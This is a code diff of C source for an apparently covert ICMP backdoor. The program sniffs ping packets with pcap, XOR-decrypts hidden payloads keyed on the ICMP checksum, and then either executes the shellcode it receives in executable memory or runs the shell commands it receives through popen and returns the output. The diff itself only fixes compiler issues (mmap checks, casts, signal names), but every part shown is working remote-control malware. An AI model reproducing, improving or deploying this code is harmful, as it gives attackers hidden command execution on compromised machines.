@@ -70,19 +70,23 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
 	
 	// We need some more memory to work
-	if(executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
+	if((executable = mmap(NULL, size, 
+               PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, 
+               -1, 0)) != MAP_FAILED) {
 		
 		// Copy our prefix and shellcode in
 		memcpy(executable, shellcode, size);
 
 		// Create a new stack area for payloads that need writable/executable stack	
-		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
+		if ((new_stack = mmap(NULL, STACK_SIZE, 
+               PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED,
+               -1, 0)) != MAP_FAILED) {
 
 			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
-         	__asm__("mov -0x0C(%ebp),%eax");
+         __asm__("mov -0x0C(%ebp),%eax");
         	__asm__("mov -0x10(%ebp),%esp");
         	__asm__("add $0x0100, %esp");
-         	__asm__("jmp *%eax");
+         __asm__("jmp *%eax");
 		}
 	}
 }
@@ -100,12 +104,12 @@ void run_command(const unsigned char *command, uint32_t size, const struct iphdr
 	// Need to copy and null terminate the command
 	memset(cmd, 0, cmd_size);
 	memcpy(cmd, command, size);
-	strncat(cmd, REDIRECT, cmd_size);
+	strncat((char *)cmd, REDIRECT, cmd_size);
 
 	// Set the response magic and type
 	memset(msg, 0, msg_size);
-	strncat(msg, MAGIC, msg_size);
-	strncat(msg, "\x02", msg_size);
+	strncat((char *)msg, MAGIC, msg_size);
+	strncat((char *)msg, "\x02", msg_size);
 
 	// Quack
 	msg_data = msg + msg_hdr_size;
@@ -114,7 +118,7 @@ void run_command(const unsigned char *command, uint32_t size, const struct iphdr
 	memset(buf, 0, sizeof(buf));
 
 	// Execute the command
-	if((fd = popen(cmd, "r")) != NULL) {
+	if((fd = popen((char *)cmd, "r")) != NULL) {
 		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {
 
 			// Need to pad if there isn't enough data (already nulled out)
@@ -136,8 +140,8 @@ void run_command(const unsigned char *command, uint32_t size, const struct iphdr
 	}
 }
 
-int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
-	int ctr;
+uint32_t decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
+	uint32_t ctr;
 
 
 	for(ctr = 0; ctr < size; ctr++) {	
@@ -150,9 +154,10 @@ int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint
 void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
 	unsigned char decoded_data[size];
 	unsigned char *key = (unsigned char *)&(icmp->checksum);
-	uint32_t data_len = 0, hdr_len = 0, pid = 0, status = 0;
+	uint32_t data_len = 0, hdr_len = 0;
 	uint8_t msg_type = 0;
-
+   pid_t pid;
+   int status =0;
 	// Make sure we have data
 	if(size > 0) {
 
@@ -160,7 +165,7 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 		if(decrypt_message(data, decoded_data, size, key) > 0) {
 
 			// Make sure the magic is there
-			if(!strncmp(decoded_data, MAGIC, strlen(MAGIC))) {
+			if(!strncmp((char *)decoded_data, MAGIC, strlen(MAGIC))) {
 				hdr_len = strlen(MAGIC) + 1;
 				data_len = size - hdr_len;
 				msg_type = decoded_data[hdr_len - 1];
@@ -193,14 +198,14 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 }
 
 void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
-	const struct ether_arp *ethernet = NULL;
+//	const struct ether_arp *ethernet = NULL;
 	const struct iphdr *ip = NULL;
 	const struct icmphdr *icmp = NULL;
-	uint32_t size_ip, size_icmp, size_data;
+	uint32_t size_ip, size_icmp;//, size_data;
 	const unsigned char *data = NULL;
 
 	// Ethernet
-	ethernet = (struct ether_arp *)pkt;
+	//ethernet = (struct ether_arp *)pkt;
 
 	// IP
 	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
@@ -212,7 +217,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 
 	// Data
 	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
-	size_data = (hdr->len - size_ip - size_icmp - SIZE_ETHERNET);
+	//size_data = (hdr->len - size_ip - size_icmp - SIZE_ETHERNET);
 
 	// Only want to deal with icmp echo requests
 	if((icmp->type == 8) && (icmp->code == 0)) {
@@ -220,7 +225,7 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 	}
 }
 
-int main(int argc, char *argv[0]) {
+int main(int argc, char **argv) {
 	pcap_t *handle = NULL;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	struct bpf_program fp;
@@ -261,7 +266,7 @@ int main(int argc, char *argv[0]) {
 	}
 
 	// We don't care about children
-	signal(SIG_CHILD, SIG_IGN);
+	signal(SIGCHLD, SIG_IGN);
 
 	// Now we can finally sniff
 	pcap_loop(handle, -1, process_packet, NULL);
